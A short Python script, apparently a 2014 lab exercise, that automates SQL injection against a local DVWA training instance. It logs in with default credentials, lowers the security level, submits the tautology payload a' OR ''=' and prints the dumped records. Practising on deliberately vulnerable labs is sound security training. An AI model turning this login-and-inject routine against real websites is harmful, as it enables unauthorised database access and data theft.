#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:      DVWA SQL Injection automation script
#
# Author:      darklord
#
# Created:     08/07/2014
# Copyright:   (c) darklord 2014
# Licence:     <your licence>
#-------------------------------------------------------------------------------

import mechanize
from bs4 import BeautifulSoup

cookies = mechanize.CookieJar()
br1 = mechanize.Browser()
br1.set_cookiejar(cookies)

# Browser options
br1.set_handle_equiv(True)
br1.set_handle_gzip(True)
br1.set_handle_redirect(True)
br1.set_handle_referer(True)
br1.set_handle_robots(False)

# Want debugging messages?
#br1.set_debug_http(True)
#br1.set_debug_redirects(True)
#br1.set_debug_responses(True)

# User-Agent
br1.addheaders = [('User-agent', 'Firefox/3.0.1')]

print('browser 1')
br1.open('http://127.0.0.1/DVWA-1.0.8/')
for form in br1.forms():
    print form

br1.select_form(nr=0)
br1.form['username'] = 'admin'
br1.form['password'] = 'password'
br1.submit()

#print br1.response().info()

# print the webpage
#print br1.response().read()

print (br1.title())
#read links
#for link in br1.links():
#    print link.url +':'+link.text

br1.open('http://127.0.0.1/DVWA-1.0.8/security.php')
print (br1.title())
# Set security level to easy or medium
br1.select_form(nr=0)
#br1.form['security'] = ['low']
#br1.submit()

#br1.select_form(nr=0)
br1.form.find_control(name="security", kind="list").value = ['low']
br1.submit()
print br1.response().read()

br1.open('http://127.0.0.1/DVWA-1.0.8/vulnerabilities/sqli/')
print (br1.title())
for form in br1.forms():
    print form
br1.select_form(nr=0)
br1.form['id'] = r"a' OR ''='"
br1.submit()

#print br1.response().read()

html = br1.response().read()
bs = BeautifulSoup(html)

IDs = bs.find_all('div', {'class' : 'vulnerable_code_area'})

for ID in IDs[0].find_all('pre'):
   print ID



#Second browser instance
#br2 = mechanize.Browser()
#br2.set_cookiejar(cookies)
#br2.open('http://127.0.0.1/DVWA-1.0.8/vulnerabilities/sqli/')
#print(br2.title())


